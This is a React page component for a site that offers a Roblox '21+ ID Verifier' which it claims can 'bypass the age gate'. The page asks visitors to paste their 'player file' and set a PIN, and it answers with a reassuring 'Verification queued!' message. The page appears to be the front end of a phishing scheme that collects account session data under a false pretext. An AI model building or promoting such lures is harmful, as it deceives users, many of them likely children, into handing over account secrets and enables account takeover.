import React from 'react';
import BackButton from '@/components/BackButton';
import ToolForm from '@/components/ToolForm';
import VideoTutorial from '@/components/VideoTutorial';
import { siteConfig, toolsConfig } from '@/config/toolsConfig';

const IdVerifier = () => (
  <div className="min-h-screen bg-blox-gradient">
    <div className="container mx-auto px-4 py-8">
      <BackButton />
      <h1 className="text-4xl font-bold mb-2 text-center">{siteConfig.name}</h1>
      <p className="text-center text-gray-400 mb-12">
        Verify any Roblox account as 21+ instantly — bypass the age gate.
      </p>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto">
        <ToolForm
          toolType="21+ ID Verifier"
          toolKey="id_verifier"
          title="21+ ID Verifier"
          description="Paste your player file below and create a PIN. Our system will 21+ verify the account securely."
          buttonLabel="Verify 21+"
          successMessage="Verification queued!"
          filePlaceholder="Enter player file"
        />
        <VideoTutorial toolKey="id_verifier" youtubeUrl={toolsConfig.idVerifier.youtubeUrl} />
      </div>
    </div>
  </div>
);

export default IdVerifier;
